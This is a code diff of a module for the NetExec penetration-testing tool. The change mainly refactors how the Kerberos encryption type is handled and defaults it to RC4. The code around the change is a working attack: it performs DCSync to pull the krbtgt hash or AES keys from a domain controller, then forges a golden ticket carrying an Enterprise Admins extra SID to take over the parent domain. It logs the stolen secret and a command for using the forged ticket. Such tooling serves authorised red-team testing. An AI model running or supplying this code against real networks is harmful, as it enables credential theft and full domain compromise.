@@ -49,7 +49,7 @@ class NXCModule:
         self.krbtgt_hash = ""
         self.aes128_key = ""
         self.aes256_key = ""
-        self.etype = None
+        self.etype = "rc4"
 
     def options(self, context, module_options):
         """
@@ -169,9 +169,6 @@ class NXCModule:
         return entries[0]["nETBIOSName"]
 
     def _dcsync_krbtgt(self, smb_conn, ldap_conn):
-        etype = self.etype
-        need_kerberos_keys = etype in ("aes128", "aes256")
-
         try:
             rop = RemoteOperations(
                 smb_conn,
@@ -199,15 +196,15 @@ class NXCModule:
                 isRemote=True,
                 noLMHash=True,
                 remoteOps=rop,
-                justNTLM=not need_kerberos_keys,
+                justNTLM=self.etype == "rc4",
                 justUser=target_user,
                 printUserStatus=False,
                 perSecretCallback=grab_hash,
             )
             ntds.dump()
 
-            secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(etype)
-            label = "hash" if etype == "rc4" else f"{etype.upper()} key"
+            secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(self.etype)
+            label = "hash" if self.etype == "rc4" else f"{self.etype.upper()} key"
             if secret:
                 self.context.log.highlight(f"krbtgt {label}: {secret}")
             else:
@@ -227,8 +224,6 @@ class NXCModule:
                 smb_conn.logoff()
 
     def get_krbtgt_hash(self, connection):
-        etype = self.etype
-
         try:
             smb_conn = self._get_smb_session(connection)
             self._dcsync_krbtgt(smb_conn, connection)
@@ -236,28 +231,22 @@ class NXCModule:
             self.context.log.fail(f"Error during DCSync: {e}")
             return
 
-        can_forge = False
-        if (etype == "rc4" and self.krbtgt_hash) or (etype == "aes128" and self.aes128_key) or (etype == "aes256" and self.aes256_key):
-            can_forge = True
-
-        if can_forge:
+        if (self.etype == "rc4" and self.krbtgt_hash) or (self.etype == "aes128" and self.aes128_key) or (self.etype == "aes256" and self.aes256_key):
             try:
                 tgt = self.forge_golden_ticket(connection)
-                self.context.log.success(f"Golden ticket forged successfully (etype: {etype}). Saved to: {tgt}")
+                self.context.log.success(f"Golden ticket forged successfully (etype: {self.etype}). Saved to: {tgt}")
                 self.context.log.success(f"Run the following command to use the TGT: export KRB5CCNAME={tgt}")
                 self.forged_tgt = tgt
             except Exception as e:
                 self.context.log.fail(f"Error while generating golden ticket : {e}")
         else:
-            self.context.log.fail(f"Cannot forge ticket: required key for etype '{etype}' not found.")
+            self.context.log.fail(f"Cannot forge ticket: required hash/key for etype '{self.etype}' not found.")
 
     def forge_golden_ticket(self, connection):
         """
         Forge a golden ticket for the parent domain using the krbtgt key.
         Supports optional USER, RID, USER_ID and ETYPE module options.
         """
-        etype = self.etype
-
         admin_name = self.module_options.get("USER", "Administrator")
         extra_rid = str(self.module_options.get("RID", "519"))
         extra_sid = f"{self.parent_sid}-{extra_rid}"
@@ -267,9 +256,9 @@ class NXCModule:
         groups_list = [513, 512, 520, 518, 519]
 
         # Create ticket
-        enctype_value, checksum_type, sig_size, key_size = ETYPE_CONFIG[etype]
+        enctype_value, checksum_type, sig_size, key_size = ETYPE_CONFIG[self.etype]
         key_map = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}
-        raw_key = self._clean_nthash(key_map[etype]) if etype == "rc4" else key_map[etype]
+        raw_key = self._clean_nthash(key_map[self.etype]) if self.etype == "rc4" else key_map[self.etype]
         krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(raw_key))
 
         validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
@@ -461,8 +450,7 @@ class NXCModule:
 
         pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()
 
-    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int,
-                            enctype_value: int, pac_infos: dict, key_size: int) -> tuple[EncASRepPart, EncTicketPart, dict]:
+    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int, enctype_value: int, pac_infos: dict, key_size: int) -> tuple[EncASRepPart, EncTicketPart, dict]:
         now_utc = datetime.datetime.now(datetime.timezone.utc)
         end_utc = now_utc + datetime.timedelta(hours=duration_hours)
 
